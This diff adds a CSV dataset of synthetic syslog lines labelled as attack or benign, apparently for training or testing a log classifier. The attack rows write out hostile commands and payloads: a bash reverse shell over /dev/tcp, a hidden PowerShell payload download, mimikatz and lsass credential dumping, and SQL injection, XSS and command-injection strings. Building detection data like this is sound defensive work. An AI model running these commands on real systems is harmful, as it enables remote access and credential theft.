@@ -1,0 +1,501 @@
+raw,label
+Jan  1 00:00:00 edge-fw01 sshd[1000]: Failed password for root from 10.0.0.1 port 1024 ssh2,1
+Feb  2 01:07:13 web01 sshd[1037]: Invalid user admin from 10.0.0.2 port 1197,1
+Mar  3 02:14:26 web02 sshd[1074]: Failed password for invalid user oracle from 10.0.0.3 port 1370 ssh2,1
+Apr  4 03:21:39 auth01 sshd[1111]: maximum authentication attempts exceeded for root from 10.0.0.4 port 1543 ssh2 [preauth],1
+May  5 04:28:52 vpn01 sshd[1148]: PAM 6 more authentication failures; user=root rhost=10.0.0.5,1
+Jun  6 05:35:05 db01 kernel[1185]: SYN scan detected from 10.0.0.6 to 192.168.0.15:22 flags=SYN window=1024,1
+Jul  7 06:42:18 app01 suricata[1222]: ET SCAN Nmap Scripting Engine User-Agent detected from 10.0.0.7 to 192.168.0.16,1
+Aug  8 07:49:31 mail01 firewall[1259]: Port scan detected: nmap -sV 192.168.0.17 from 10.0.0.8 ports 1-1024,1
+"Sep  9 08:56:44 proxy01 kernel[1296]: TCP stealth scan from 10.0.0.9 to 172.16.0.28:443 flags=FIN,URG,PSH",1
+Oct 10 09:03:57 worker01 snort[1333]: SCAN masscan inbound sweep from 10.0.0.10 to 192.168.0.19 priority 2,1
+Jan 11 10:10:10 edge-fw01 kernel[1370]: SYN flood detected from 10.0.0.11 port 2754 to 192.168.0.20:80 packets=12800,1
+Feb 12 11:17:23 web01 nginx[1407]: Connection flood from 10.0.0.12 to 192.168.0.21:443 rate=5000/sec action=drop,1
+Mar 13 12:24:36 web02 haproxy[1444]: DoS threshold exceeded client=10.0.0.13 backend=api conn_rate=2200/s,1
+Apr 14 13:31:49 auth01 firewall[1481]: DDoS UDP flood detected source=10.0.0.14 destination=172.16.0.33 dport=53,1
+May 15 14:38:02 vpn01 kernel[1518]: possible TCP SYN flood on port 80 from 10.0.0.15; sending cookies,1
+Jun 16 15:45:15 db01 nginx[1555]: GET /admin?user=admin' OR 1=1-- HTTP/1.1 from 10.0.0.16 returned 403,1
+Jul 17 16:52:28 app01 nginx[1592]: POST /search?q=<script>alert(1)</script> HTTP/1.1 from 10.0.0.17 returned 403,1
+Aug 18 17:59:41 mail01 apache2[1629]: SQL injection attempt select union password from users src=10.0.0.18 uri=/login,1
+Sep 19 18:06:54 proxy01 apache2[1666]: XSS attack blocked src=10.0.0.19 uri=/comment?msg=<img src=x onerror=alert(1)>,1
+Oct 20 19:13:07 worker01 modsecurity[1703]: Command injection attempt src=10.0.0.20 uri=/cgi-bin/status?cmd=/bin/sh -c id,1
+Jan 21 20:20:20 edge-fw01 winlogbeat[1740]: Process creation powershell.exe -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQ== user=jsmith host=192.168.0.30,1
+Feb 22 21:27:33 web01 sysmon[1777]: mimikatz.exe sekurlsa::logonpasswords executed by user=administrator src=10.0.0.22,1
+Mar 23 22:34:46 web02 edr[1814]: Suspicious credential dump tool procdump.exe -ma lsass.exe from host 192.168.0.32,1
+Apr 24 23:41:59 auth01 auditd[1851]: bash spawned reverse shell /bin/bash -i >& /dev/tcp/10.0.0.24/4444 0>&1 uid=1001,1
+May 25 00:48:12 vpn01 powershell[1888]: Invoke-WebRequest hxxp://10.0.0.25/payload.ps1 followed by powershell.exe -nop -w hidden,1
+Jun 26 01:55:25 db01 dnsmasq[1925]: Outbound DNS query to c2.evil.example.com from 192.168.0.35 classified malware C2,1
+Jul 27 02:02:38 app01 proxy[1962]: Outbound connection to evil.example.com:443 from 192.168.0.36 user=svc-backup action=blocked,1
+Aug 28 03:09:51 mail01 clamav[1999]: Known malware hash detected: abc123 src=192.168.0.37 file=/tmp/dropper.exe signature=Trojan.Generic,1
+Sep  1 04:16:04 proxy01 suricata[2036]: ET MALWARE C2 communication detected from 192.168.0.38 to 10.0.0.29:443 JA3=badc0ffee,1
+Oct  2 05:23:17 worker01 firewall[2073]: Beaconing behavior detected host=192.168.0.39 destination=malware-control.example.net interval=60s,1
+Jan  3 06:30:30 edge-fw01 sudo[2110]: root : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash,1
+Feb  4 07:37:43 web01 auditd[2147]: privilege escalation attempt pkexec /bin/bash by uid=1001 auid=1001 src=192.168.0.41,1
+Mar  5 08:44:56 web02 sudo[2184]: authentication failure ; user=dev ; rhost=10.0.0.33 ; COMMAND=/usr/bin/su root,1
+Apr  6 09:51:09 auth01 kernel[2221]: DirtyPipe CVE-2022-0847 exploit attempt detected from process ./exploit uid=1001,1
+May  7 10:58:22 vpn01 auditd[2258]: chmod u+s /bin/bash executed by user=www-data possible privilege escalation,1
+Jun  8 11:05:35 db01 sshd[2295]: Failed password for root from 10.0.0.36 port 7079 ssh2,1
+Jul  9 12:12:48 app01 sshd[2332]: Invalid user admin from 10.0.0.37 port 7252,1
+Aug 10 13:19:01 mail01 sshd[2369]: Failed password for invalid user oracle from 10.0.0.38 port 7425 ssh2,1
+Sep 11 14:26:14 proxy01 sshd[2406]: maximum authentication attempts exceeded for root from 10.0.0.39 port 7598 ssh2 [preauth],1
+Oct 12 15:33:27 worker01 sshd[2443]: PAM 6 more authentication failures; user=root rhost=10.0.0.40,1
+Jan 13 16:40:40 edge-fw01 kernel[2480]: SYN scan detected from 10.0.0.41 to 192.168.0.50:22 flags=SYN window=1024,1
+Feb 14 17:47:53 web01 suricata[2517]: ET SCAN Nmap Scripting Engine User-Agent detected from 10.0.0.42 to 192.168.0.51,1
+Mar 15 18:54:06 web02 firewall[2554]: Port scan detected: nmap -sV 192.168.0.52 from 10.0.0.43 ports 1-1024,1
+"Apr 16 19:01:19 auth01 kernel[2591]: TCP stealth scan from 10.0.0.44 to 172.16.0.63:443 flags=FIN,URG,PSH",1
+May 17 20:08:32 vpn01 snort[2628]: SCAN masscan inbound sweep from 10.0.0.45 to 192.168.0.54 priority 2,1
+Jun 18 21:15:45 db01 kernel[2665]: SYN flood detected from 10.0.0.46 port 8809 to 192.168.0.55:80 packets=12800,1
+Jul 19 22:22:58 app01 nginx[2702]: Connection flood from 10.0.0.47 to 192.168.0.56:443 rate=5000/sec action=drop,1
+Aug 20 23:29:11 mail01 haproxy[2739]: DoS threshold exceeded client=10.0.0.48 backend=api conn_rate=2200/s,1
+Sep 21 00:36:24 proxy01 firewall[2776]: DDoS UDP flood detected source=10.0.0.49 destination=172.16.0.68 dport=53,1
+Oct 22 01:43:37 worker01 kernel[2813]: possible TCP SYN flood on port 80 from 10.0.0.50; sending cookies,1
+Jan 23 02:50:50 edge-fw01 nginx[2850]: GET /admin?user=admin' OR 1=1-- HTTP/1.1 from 10.0.1.51 returned 403,1
+Feb 24 03:57:03 web01 nginx[2887]: POST /search?q=<script>alert(1)</script> HTTP/1.1 from 10.0.1.52 returned 403,1
+Mar 25 04:04:16 web02 apache2[2924]: SQL injection attempt select union password from users src=10.0.1.53 uri=/login,1
+Apr 26 05:11:29 auth01 apache2[2961]: XSS attack blocked src=10.0.1.54 uri=/comment?msg=<img src=x onerror=alert(1)>,1
+May 27 06:18:42 vpn01 modsecurity[2998]: Command injection attempt src=10.0.1.55 uri=/cgi-bin/status?cmd=/bin/sh -c id,1
+Jun 28 07:25:55 db01 winlogbeat[3035]: Process creation powershell.exe -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQ== user=jsmith host=192.168.0.65,1
+Jul  1 08:32:08 app01 sysmon[3072]: mimikatz.exe sekurlsa::logonpasswords executed by user=administrator src=10.0.1.57,1
+Aug  2 09:39:21 mail01 edr[3109]: Suspicious credential dump tool procdump.exe -ma lsass.exe from host 192.168.0.67,1
+Sep  3 10:46:34 proxy01 auditd[3146]: bash spawned reverse shell /bin/bash -i >& /dev/tcp/10.0.1.59/4444 0>&1 uid=1001,1
+Oct  4 11:53:47 worker01 powershell[3183]: Invoke-WebRequest hxxp://10.0.1.60/payload.ps1 followed by powershell.exe -nop -w hidden,1
+Jan  5 12:00:00 edge-fw01 dnsmasq[3220]: Outbound DNS query to c2.evil.example.com from 192.168.0.70 classified malware C2,1
+Feb  6 13:07:13 web01 proxy[3257]: Outbound connection to evil.example.com:443 from 192.168.0.71 user=svc-backup action=blocked,1
+Mar  7 14:14:26 web02 clamav[3294]: Known malware hash detected: abc123 src=192.168.0.72 file=/tmp/dropper.exe signature=Trojan.Generic,1
+Apr  8 15:21:39 auth01 suricata[3331]: ET MALWARE C2 communication detected from 192.168.0.73 to 10.0.1.64:443 JA3=badc0ffee,1
+May  9 16:28:52 vpn01 firewall[3368]: Beaconing behavior detected host=192.168.0.74 destination=malware-control.example.net interval=60s,1
+Jun 10 17:35:05 db01 sudo[3405]: root : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash,1
+Jul 11 18:42:18 app01 auditd[3442]: privilege escalation attempt pkexec /bin/bash by uid=1001 auid=1001 src=192.168.0.76,1
+Aug 12 19:49:31 mail01 sudo[3479]: authentication failure ; user=dev ; rhost=10.0.1.68 ; COMMAND=/usr/bin/su root,1
+Sep 13 20:56:44 proxy01 kernel[3516]: DirtyPipe CVE-2022-0847 exploit attempt detected from process ./exploit uid=1001,1
+Oct 14 21:03:57 worker01 auditd[3553]: chmod u+s /bin/bash executed by user=www-data possible privilege escalation,1
+Jan 15 22:10:10 edge-fw01 sshd[3590]: Failed password for root from 10.0.1.71 port 13134 ssh2,1
+Feb 16 23:17:23 web01 sshd[3627]: Invalid user admin from 10.0.1.72 port 13307,1
+Mar 17 00:24:36 web02 sshd[3664]: Failed password for invalid user oracle from 10.0.1.73 port 13480 ssh2,1
+Apr 18 01:31:49 auth01 sshd[3701]: maximum authentication attempts exceeded for root from 10.0.1.74 port 13653 ssh2 [preauth],1
+May 19 02:38:02 vpn01 sshd[3738]: PAM 6 more authentication failures; user=root rhost=10.0.1.75,1
+Jun 20 03:45:15 db01 kernel[3775]: SYN scan detected from 10.0.1.76 to 192.168.0.85:22 flags=SYN window=1024,1
+Jul 21 04:52:28 app01 suricata[3812]: ET SCAN Nmap Scripting Engine User-Agent detected from 10.0.1.77 to 192.168.0.86,1
+Aug 22 05:59:41 mail01 firewall[3849]: Port scan detected: nmap -sV 192.168.0.87 from 10.0.1.78 ports 1-1024,1
+"Sep 23 06:06:54 proxy01 kernel[3886]: TCP stealth scan from 10.0.1.79 to 172.16.1.98:443 flags=FIN,URG,PSH",1
+Oct 24 07:13:07 worker01 snort[3923]: SCAN masscan inbound sweep from 10.0.1.80 to 192.168.0.89 priority 2,1
+Jan 25 08:20:20 edge-fw01 kernel[3960]: SYN flood detected from 10.0.1.81 port 14864 to 192.168.0.90:80 packets=12800,1
+Feb 26 09:27:33 web01 nginx[3997]: Connection flood from 10.0.1.82 to 192.168.0.91:443 rate=5000/sec action=drop,1
+Mar 27 10:34:46 web02 haproxy[4034]: DoS threshold exceeded client=10.0.1.83 backend=api conn_rate=2200/s,1
+Apr 28 11:41:59 auth01 firewall[4071]: DDoS UDP flood detected source=10.0.1.84 destination=172.16.1.103 dport=53,1
+May  1 12:48:12 vpn01 kernel[4108]: possible TCP SYN flood on port 80 from 10.0.1.85; sending cookies,1
+Jun  2 13:55:25 db01 nginx[4145]: GET /admin?user=admin' OR 1=1-- HTTP/1.1 from 10.0.1.86 returned 403,1
+Jul  3 14:02:38 app01 nginx[4182]: POST /search?q=<script>alert(1)</script> HTTP/1.1 from 10.0.1.87 returned 403,1
+Aug  4 15:09:51 mail01 apache2[4219]: SQL injection attempt select union password from users src=10.0.1.88 uri=/login,1
+Sep  5 16:16:04 proxy01 apache2[4256]: XSS attack blocked src=10.0.1.89 uri=/comment?msg=<img src=x onerror=alert(1)>,1
+Oct  6 17:23:17 worker01 modsecurity[4293]: Command injection attempt src=10.0.1.90 uri=/cgi-bin/status?cmd=/bin/sh -c id,1
+Jan  7 18:30:30 edge-fw01 winlogbeat[4330]: Process creation powershell.exe -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQ== user=jsmith host=192.168.0.100,1
+Feb  8 19:37:43 web01 sysmon[4367]: mimikatz.exe sekurlsa::logonpasswords executed by user=administrator src=10.0.1.92,1
+Mar  9 20:44:56 web02 edr[4404]: Suspicious credential dump tool procdump.exe -ma lsass.exe from host 192.168.0.102,1
+Apr 10 21:51:09 auth01 auditd[4441]: bash spawned reverse shell /bin/bash -i >& /dev/tcp/10.0.1.94/4444 0>&1 uid=1001,1
+May 11 22:58:22 vpn01 powershell[4478]: Invoke-WebRequest hxxp://10.0.1.95/payload.ps1 followed by powershell.exe -nop -w hidden,1
+Jun 12 23:05:35 db01 dnsmasq[4515]: Outbound DNS query to c2.evil.example.com from 192.168.0.105 classified malware C2,1
+Jul 13 00:12:48 app01 proxy[4552]: Outbound connection to evil.example.com:443 from 192.168.0.106 user=svc-backup action=blocked,1
+Aug 14 01:19:01 mail01 clamav[4589]: Known malware hash detected: abc123 src=192.168.0.107 file=/tmp/dropper.exe signature=Trojan.Generic,1
+Sep 15 02:26:14 proxy01 suricata[4626]: ET MALWARE C2 communication detected from 192.168.0.108 to 10.0.1.99:443 JA3=badc0ffee,1
+Oct 16 03:33:27 worker01 firewall[4663]: Beaconing behavior detected host=192.168.0.109 destination=malware-control.example.net interval=60s,1
+Jan 21 16:40:40 edge-fw01 sshd[38000]: Accepted password for user1 from 192.168.1.50 port 22 ssh2,0
+Feb 22 17:47:53 web01 sshd[38037]: Accepted publickey for deploy from 192.168.1.51 port 12197 ssh2: RSA SHA256:OK,0
+Mar 23 18:54:06 web02 sshd[38074]: pam_unix(sshd:session): session opened for user backup by (uid=0),0
+Apr 24 19:01:19 auth01 sshd[38111]: pam_unix(sshd:session): session closed for user backup,0
+May 25 20:08:32 vpn01 systemd[38148]: Started Session 1005 of user appsvc.,0
+Jun 26 21:15:45 db01 systemd[38185]: Stopped target Multi-User System.,0
+Jul 27 22:22:58 app01 systemd[38222]: Reached target Network is Online.,0
+Aug 28 23:29:11 mail01 systemd[38259]: Started OpenSSH Daemon.,0
+Sep  1 00:36:24 proxy01 systemd[38296]: Reloaded The nginx HTTP and reverse proxy server.,0
+Oct  2 01:43:37 worker01 kernel[38333]: Linux version 6.6.10 booting with command line quiet splash,0
+Jan  3 02:50:50 edge-fw01 kernel[38370]: EXT4-fs (sda1): mounted filesystem with ordered data mode,0
+"Feb  4 03:57:03 web01 kernel[38407]: eth0: link up, 1000Mbps, full-duplex, lpa 0x45E1",0
+Mar  5 04:04:16 web02 cron[38444]: (root) CMD (/usr/lib/sa/sa1 1 1),0
+Apr  6 05:11:29 auth01 cron[38481]: (backup) CMD (/usr/local/bin/backup-metadata --quiet),0
+May  7 06:18:42 vpn01 CRON[38518]: pam_unix(cron:session): session opened for user root by (uid=0),0
+Jun  8 07:25:55 db01 CRON[38555]: pam_unix(cron:session): session closed for user root,0
+Jul  9 08:32:08 app01 logrotate[38592]: rotated /var/log/nginx/access.log successfully,0
+Aug 10 09:39:21 mail01 rsyslogd[38629]: action action-0-builtin:omfile resumed,0
+"Sep 11 10:46:34 proxy01 smartd[38666]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 31 to 32",0
+Oct 12 11:53:47 worker01 node_exporter[38703]: disk space report filesystem=/var used=42% available=58%,0
+Jan 13 12:00:00 edge-fw01 df-monitor[38740]: disk space OK mount=/home used=37% available=63%,0
+Feb 14 13:07:13 web01 postgres[38777]: checkpoint complete: wrote 124 buffers; sync time=0.041 s,0
+Mar 15 14:14:26 web02 postgres[38814]: connection authorized: user=app database=logs application_name=api,0
+Apr 16 15:21:39 auth01 nginx[38851]: GET /health HTTP/1.1 from 192.168.1.73 returned 200 bytes=32,0
+May 17 16:28:52 vpn01 nginx[38888]: GET /index.html HTTP/1.1 from 172.16.3.124 returned 200 bytes=4380,0
+Jun 18 17:35:05 db01 nginx[38925]: POST /api/v1/events HTTP/1.1 from 192.168.1.75 returned 201 bytes=118,0
+Jul 19 18:42:18 app01 apache2[38962]: GET /static/app.css HTTP/1.1 from 172.16.3.126 returned 304 bytes=0,0
+Aug 20 19:49:31 mail01 apache2[38999]: GET /favicon.ico HTTP/1.1 from 192.168.1.77 returned 200 bytes=5430,0
+"Sep 21 20:56:44 proxy01 haproxy[39036]: Server api/app01 is UP, reason: Layer7 check passed, code: 200",0
+Oct 22 21:03:57 worker01 haproxy[39073]: Connect from 192.168.1.79:53210 to 172.16.3.129:443 frontend https-in,0
+Jan 23 22:10:10 edge-fw01 docker[39110]: Container logfilter-api restarted successfully with exit code 0,0
+Feb 24 23:17:23 web01 containerd[39147]: StartContainer for container web completed successfully,0
+Mar 25 00:24:36 web02 kafka[39184]: Completed leader election for partition raw-logs-0 leader broker=1,0
+Apr 26 01:31:49 auth01 kafka[39221]: Group logfilter-router stable with 1 members generation 1034,0
+May 27 02:38:02 vpn01 elasticsearch[39258]: cluster health status changed from [YELLOW] to [GREEN],0
+Jun 28 03:45:15 db01 elasticsearch[39295]: rollover index raw-logs-000012 completed successfully,0
+Jul  1 04:52:28 app01 redis[39332]: Background saving terminated with success,0
+Aug  2 05:59:41 mail01 redis[39369]: Accepted connection from 172.16.3.137:6379,0
+Sep  3 06:06:54 proxy01 sudo[39406]: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart logfilter-api,0
+Oct  4 07:13:07 worker01 sudo[39443]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000),0
+Jan  5 08:20:20 edge-fw01 auditd[39480]: SERVICE_START pid=1 uid=0 auid=4294967295 msg=unit=cron comm=systemd,0
+Feb  6 09:27:33 web01 auditd[39517]: USER_LOGIN pid=1021 uid=0 auid=1000 msg=op=login id=1000 exe=/usr/sbin/sshd hostname=192.168.1.91 res=success,0
+Mar  7 10:34:46 web02 NetworkManager[39554]: device (eth0): state change: activated -> deactivating (reason user-requested),0
+Apr  8 11:41:59 auth01 NetworkManager[39591]: device (eth0): state change: config -> ip-check (reason none),0
+May  9 12:48:12 vpn01 dhclient[39628]: DHCPACK of 192.168.1.94 from 192.168.1.1,0
+Jun 10 13:55:25 db01 systemd-timesyncd[39665]: Synchronized to time server 162.159.200.123:123 (time.cloudflare.com).,0
+Jul 11 14:02:38 app01 chronyd[39702]: Selected source 169.254.169.123,0
+Aug 12 15:09:51 mail01 mail[39739]: postfix/qmgr[1542]: queued as 9A12B3C4D5 to=<ops@example.com> relay=local,0
+Sep 13 16:16:04 proxy01 postfix/smtp[39776]: status=sent (250 2.0.0 Ok: queued as 12345),0
+Oct 14 17:23:17 worker01 ufw[39813]: ALLOW OUT eth0 SRC=192.168.1.99 DST=8.8.8.8 LEN=76 PROTO=UDP SPT=5353 DPT=53,0
+Jan 15 18:30:30 edge-fw01 iptables[39850]: ACCEPT INPUT IN=eth0 OUT= MAC=00:11:22 SRC=192.168.1.100 DST=172.16.4.150 PROTO=TCP SPT=443 DPT=54822,0
+Feb 16 19:37:43 web01 prometheus[39887]: Scrape of target logfilter-api:8080 completed in 18ms status=200,0
+Mar 17 20:44:56 web02 grafana[39924]: Request Completed method=GET path=/api/health status=200 remote_addr=192.168.1.102,0
+Apr 18 21:51:09 auth01 backup[39961]: nightly backup completed successfully files=12890 bytes=987654321 duration=420s,0
+May 19 22:58:22 vpn01 backup[39998]: snapshot created repository=prod-snapshots snapshot=logs-1055 state=SUCCESS,0
+Jun 20 23:05:35 db01 clamav[40035]: SelfCheck: Database status OK.,0
+Jul 21 00:12:48 app01 clamav[40072]: Database correctly reloaded (9234567 signatures),0
+Aug 22 01:19:01 mail01 cupsd[40109]: Successful-Ok request from localhost for printer office-laser,0
+Sep 23 02:26:14 proxy01 systemd[40146]: Started Cleanup of Temporary Directories.,0
+Oct 24 03:33:27 worker01 systemd[40183]: Finished Daily apt download activities.,0
+Jan 25 04:40:40 edge-fw01 sshd[40220]: Accepted password for user1 from 192.168.1.110 port 22 ssh2,0
+Feb 26 05:47:53 web01 sshd[40257]: Accepted publickey for deploy from 192.168.1.111 port 22577 ssh2: RSA SHA256:OK,0
+Mar 27 06:54:06 web02 sshd[40294]: pam_unix(sshd:session): session opened for user backup by (uid=0),0
+Apr 28 07:01:19 auth01 sshd[40331]: pam_unix(sshd:session): session closed for user backup,0
+May  1 08:08:32 vpn01 systemd[40368]: Started Session 1065 of user appsvc.,0
+Jun  2 09:15:45 db01 systemd[40405]: Stopped target Multi-User System.,0
+Jul  3 10:22:58 app01 systemd[40442]: Reached target Network is Online.,0
+Aug  4 11:29:11 mail01 systemd[40479]: Started OpenSSH Daemon.,0
+Sep  5 12:36:24 proxy01 systemd[40516]: Reloaded The nginx HTTP and reverse proxy server.,0
+Oct  6 13:43:37 worker01 kernel[40553]: Linux version 6.6.10 booting with command line quiet splash,0
+Jan  7 14:50:50 edge-fw01 kernel[40590]: EXT4-fs (sda1): mounted filesystem with ordered data mode,0
+"Feb  8 15:57:03 web01 kernel[40627]: eth0: link up, 1000Mbps, full-duplex, lpa 0x45E1",0
+Mar  9 16:04:16 web02 cron[40664]: (root) CMD (/usr/lib/sa/sa1 1 1),0
+Apr 10 17:11:29 auth01 cron[40701]: (backup) CMD (/usr/local/bin/backup-metadata --quiet),0
+May 11 18:18:42 vpn01 CRON[40738]: pam_unix(cron:session): session opened for user root by (uid=0),0
+Jun 12 19:25:55 db01 CRON[40775]: pam_unix(cron:session): session closed for user root,0
+Jul 13 20:32:08 app01 logrotate[40812]: rotated /var/log/nginx/access.log successfully,0
+Aug 14 21:39:21 mail01 rsyslogd[40849]: action action-0-builtin:omfile resumed,0
+"Sep 15 22:46:34 proxy01 smartd[40886]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 31 to 32",0
+Oct 16 23:53:47 worker01 node_exporter[40923]: disk space report filesystem=/var used=42% available=58%,0
+Jan 17 00:00:00 edge-fw01 df-monitor[40960]: disk space OK mount=/home used=37% available=63%,0
+Feb 18 01:07:13 web01 postgres[40997]: checkpoint complete: wrote 124 buffers; sync time=0.041 s,0
+Mar 19 02:14:26 web02 postgres[41034]: connection authorized: user=app database=logs application_name=api,0
+Apr 20 03:21:39 auth01 nginx[41071]: GET /health HTTP/1.1 from 192.168.1.133 returned 200 bytes=32,0
+May 21 04:28:52 vpn01 nginx[41108]: GET /index.html HTTP/1.1 from 172.16.4.184 returned 200 bytes=4380,0
+Jun 22 05:35:05 db01 nginx[41145]: POST /api/v1/events HTTP/1.1 from 192.168.1.135 returned 201 bytes=118,0
+Jul 23 06:42:18 app01 apache2[41182]: GET /static/app.css HTTP/1.1 from 172.16.4.186 returned 304 bytes=0,0
+Aug 24 07:49:31 mail01 apache2[41219]: GET /favicon.ico HTTP/1.1 from 192.168.1.137 returned 200 bytes=5430,0
+"Sep 25 08:56:44 proxy01 haproxy[41256]: Server api/app01 is UP, reason: Layer7 check passed, code: 200",0
+Oct 26 09:03:57 worker01 haproxy[41293]: Connect from 192.168.1.139:53210 to 172.16.4.189:443 frontend https-in,0
+Jan 27 10:10:10 edge-fw01 docker[41330]: Container logfilter-api restarted successfully with exit code 0,0
+Feb 28 11:17:23 web01 containerd[41367]: StartContainer for container web completed successfully,0
+Mar  1 12:24:36 web02 kafka[41404]: Completed leader election for partition raw-logs-0 leader broker=1,0
+Apr  2 13:31:49 auth01 kafka[41441]: Group logfilter-router stable with 1 members generation 1094,0
+May  3 14:38:02 vpn01 elasticsearch[41478]: cluster health status changed from [YELLOW] to [GREEN],0
+Jun  4 15:45:15 db01 elasticsearch[41515]: rollover index raw-logs-000012 completed successfully,0
+Jul  5 16:52:28 app01 redis[41552]: Background saving terminated with success,0
+Aug  6 17:59:41 mail01 redis[41589]: Accepted connection from 172.16.4.197:6379,0
+Sep  7 18:06:54 proxy01 sudo[41626]: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart logfilter-api,0
+Oct  8 19:13:07 worker01 sudo[41663]: pam_unix(sudo:session): session opened for user root by deploy(uid=1000),0
+Jan  9 20:20:20 edge-fw01 auditd[41700]: SERVICE_START pid=1 uid=0 auid=4294967295 msg=unit=cron comm=systemd,0
+Feb 10 21:27:33 web01 auditd[41737]: USER_LOGIN pid=1021 uid=0 auid=1000 msg=op=login id=1000 exe=/usr/sbin/sshd hostname=192.168.2.151 res=success,0
+Mar 11 22:34:46 web02 NetworkManager[41774]: device (eth0): state change: activated -> deactivating (reason user-requested),0
+Apr 12 23:41:59 auth01 NetworkManager[41811]: device (eth0): state change: config -> ip-check (reason none),0
+May 13 00:48:12 vpn01 dhclient[41848]: DHCPACK of 192.168.2.154 from 192.168.1.1,0
+Jun 14 01:55:25 db01 systemd-timesyncd[41885]: Synchronized to time server 162.159.200.123:123 (time.cloudflare.com).,0
+Jul 15 02:02:38 app01 chronyd[41922]: Selected source 169.254.169.123,0
+Aug 16 03:09:51 mail01 mail[41959]: postfix/qmgr[1542]: queued as 9A12B3C4D5 to=<ops@example.com> relay=local,0
+Sep 17 04:16:04 proxy01 postfix/smtp[41996]: status=sent (250 2.0.0 Ok: queued as 12345),0
+Oct 18 05:23:17 worker01 ufw[42033]: ALLOW OUT eth0 SRC=192.168.2.159 DST=8.8.8.8 LEN=76 PROTO=UDP SPT=5353 DPT=53,0
+Jan 19 06:30:30 edge-fw01 iptables[42070]: ACCEPT INPUT IN=eth0 OUT= MAC=00:11:22 SRC=192.168.2.160 DST=172.16.4.210 PROTO=TCP SPT=443 DPT=54822,0
+Feb 20 07:37:43 web01 prometheus[42107]: Scrape of target logfilter-api:8080 completed in 18ms status=200,0
+Mar 21 08:44:56 web02 grafana[42144]: Request Completed method=GET path=/api/health status=200 remote_addr=192.168.2.162,0
+Apr 22 09:51:09 auth01 backup[42181]: nightly backup completed successfully files=12890 bytes=987654321 duration=420s,0
+May 23 10:58:22 vpn01 backup[42218]: snapshot created repository=prod-snapshots snapshot=logs-1115 state=SUCCESS,0
+Jun 24 11:05:35 db01 clamav[42255]: SelfCheck: Database status OK.,0
+Jul 25 12:12:48 app01 clamav[42292]: Database correctly reloaded (9234567 signatures),0
+Aug 26 13:19:01 mail01 cupsd[42329]: Successful-Ok request from localhost for printer office-laser,0
+Sep 27 14:26:14 proxy01 systemd[42366]: Started Cleanup of Temporary Directories.,0
+Oct 28 15:33:27 worker01 systemd[42403]: Finished Daily apt download activities.,0
+Jan  1 16:40:40 edge-fw01 sshd[42440]: Accepted password for user1 from 192.168.2.170 port 22 ssh2,0
+Feb  2 17:47:53 web01 sshd[42477]: Accepted publickey for deploy from 192.168.2.171 port 32957 ssh2: RSA SHA256:OK,0
+Mar  3 18:54:06 web02 sshd[42514]: pam_unix(sshd:session): session opened for user backup by (uid=0),0
+Apr  4 19:01:19 auth01 sshd[42551]: pam_unix(sshd:session): session closed for user backup,0
+May  5 20:08:32 vpn01 systemd[42588]: Started Session 1125 of user appsvc.,0
+Jun  6 21:15:45 db01 systemd[42625]: Stopped target Multi-User System.,0
+Jul  7 22:22:58 app01 systemd[42662]: Reached target Network is Online.,0
+Aug  8 23:29:11 mail01 systemd[42699]: Started OpenSSH Daemon.,0
+Sep  9 00:36:24 proxy01 systemd[42736]: Reloaded The nginx HTTP and reverse proxy server.,0
+Oct 10 01:43:37 worker01 kernel[42773]: Linux version 6.6.10 booting with command line quiet splash,0
+Jan 11 02:50:50 edge-fw01 kernel[42810]: EXT4-fs (sda1): mounted filesystem with ordered data mode,0
+"Feb 12 03:57:03 web01 kernel[42847]: eth0: link up, 1000Mbps, full-duplex, lpa 0x45E1",0
+Mar 13 04:04:16 web02 cron[42884]: (root) CMD (/usr/lib/sa/sa1 1 1),0
+Apr 14 05:11:29 auth01 cron[42921]: (backup) CMD (/usr/local/bin/backup-metadata --quiet),0
+May 15 06:18:42 vpn01 CRON[42958]: pam_unix(cron:session): session opened for user root by (uid=0),0
+Jun 16 07:25:55 db01 CRON[42995]: pam_unix(cron:session): session closed for user root,0
+Jul 17 08:32:08 app01 logrotate[43032]: rotated /var/log/nginx/access.log successfully,0
+Aug 18 09:39:21 mail01 rsyslogd[43069]: action action-0-builtin:omfile resumed,0
+"Sep 19 10:46:34 proxy01 smartd[43106]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 31 to 32",0
+Oct 20 11:53:47 worker01 node_exporter[43143]: disk space report filesystem=/var used=42% available=58%,0
+Jan 21 12:00:00 edge-fw01 df-monitor[43180]: disk space OK mount=/home used=37% available=63%,0
+Feb 22 13:07:13 web01 postgres[43217]: checkpoint complete: wrote 124 buffers; sync time=0.041 s,0
+Mar 23 14:14:26 web02 postgres[43254]: connection authorized: user=app database=logs application_name=api,0
+Apr 24 15:21:39 auth01 nginx[43291]: GET /health HTTP/1.1 from 192.168.2.193 returned 200 bytes=32,0
+May 25 16:28:52 vpn01 nginx[43328]: GET /index.html HTTP/1.1 from 172.16.0.244 returned 200 bytes=4380,0
+Jun 26 17:35:05 db01 nginx[43365]: POST /api/v1/events HTTP/1.1 from 192.168.2.195 returned 201 bytes=118,0
+Jul 27 18:42:18 app01 apache2[43402]: GET /static/app.css HTTP/1.1 from 172.16.0.246 returned 304 bytes=0,0
+Aug 28 19:49:31 mail01 apache2[43439]: GET /favicon.ico HTTP/1.1 from 192.168.2.197 returned 200 bytes=5430,0
+"Sep  1 20:56:44 proxy01 haproxy[43476]: Server api/app01 is UP, reason: Layer7 check passed, code: 200",0
+Oct  2 21:03:57 worker01 haproxy[43513]: Connect from 192.168.2.199:53210 to 172.16.0.249:443 frontend https-in,0
+Jan  3 22:10:10 edge-fw01 docker[43550]: Container logfilter-api restarted successfully with exit code 0,0
+Feb  4 23:17:23 web01 containerd[43587]: StartContainer for container web completed successfully,0
